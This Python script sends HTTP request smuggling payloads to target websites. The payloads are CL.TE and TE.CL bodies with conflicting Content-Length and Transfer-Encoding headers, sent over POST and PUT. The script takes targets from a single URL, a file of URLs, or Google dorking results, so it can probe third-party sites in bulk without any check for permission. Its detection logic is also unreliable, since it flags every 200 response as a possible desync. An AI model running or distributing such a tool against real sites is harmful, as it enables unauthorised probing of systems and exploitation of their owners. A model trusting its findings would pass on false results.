import requests
import argparse
import sys
import time
from googlesearch import search

def check_desync(url):
    print(f"Checking URL: {url}")

    # Prepare more comprehensive payloads for CL.TE and TE.CL desync checks
    payloads = [
        {
            "description": "CL.TE with short body",
            "headers": {
                "Content-Length": "5",
                "Transfer-Encoding": "chunked"
            },
            "body": "0\r\n\r\nG"
        },
        {
            "description": "TE.CL with short chunk",
            "headers": {
                "Transfer-Encoding": "chunked"
            },
            "body": "5\r\nG\r\n0\r\n\r\n"
        },
        {
            "description": "CL.TE with long body",
            "headers": {
                "Content-Length": "15",
                "Transfer-Encoding": "chunked"
            },
            "body": "0\r\n\r\nG\r\n0\r\n\r\n"
        },
        {
            "description": "TE.CL with multiple chunks",
            "headers": {
                "Transfer-Encoding": "chunked"
            },
            "body": "5\r\nG\r\n5\r\n12345\r\n0\r\n\r\n"
        }
    ]

    methods = ['POST', 'PUT']

    for payload in payloads:
        for method in methods:
            try:
                if method == 'POST':
                    response = requests.post(url, headers=payload['headers'], data=payload['body'], timeout=10)
                elif method == 'PUT':
                    response = requests.put(url, headers=payload['headers'], data=payload['body'], timeout=10)
                
                print(f"Payload description: {payload['description']} | Method: {method} | Status code: {response.status_code}")
                if response.status_code == 200:
                    print(f"Possible desync detected with payload: {payload} and method: {method}")
                time.sleep(1)  # Adding a delay between requests to avoid overloading the server
            except requests.exceptions.RequestException as e:
                print(f"Error occurred with payload: {payload} and method: {method} | Error: {e}")

def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file if line.strip()]
    return urls

def search_google_dorking(dork_query, num_results):
    print(f"Searching Google with dork query: {dork_query}")
    try:
        search_results = []
        for result in search(dork_query, num_results=num_results):
            search_results.append(result)
            print(result)
        return search_results
    except Exception as e:
        print(f"Error during Google search: {e}")
        return []

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check for client-side desynchronization vulnerabilities.')

    parser.add_argument('-u', '--url', type=str, help='Single URL to check for desynchronization vulnerability.')
    parser.add_argument('-f', '--file', type=str, help='File containing a list of URLs to check for desynchronization vulnerabilities.')
    parser.add_argument('-d', '--dork', type=str, help='Google dorking query to search for potential targets.')
    parser.add_argument('-n', '--num', type=int, default=10, help='Number of Google search results to fetch.')

    args = parser.parse_args()

    if args.url:
        check_desync(args.url)
    elif args.file:
        urls = read_urls_from_file(args.file)
        for url in urls:
            check_desync(url)
    elif args.dork:
        search_results = search_google_dorking(args.dork, args.num)
        for result in search_results:
            check_desync(result)
    else:
        print("Please provide a URL with -u, a file with -f, or a Google dorking query with -d")
        sys.exit(1)

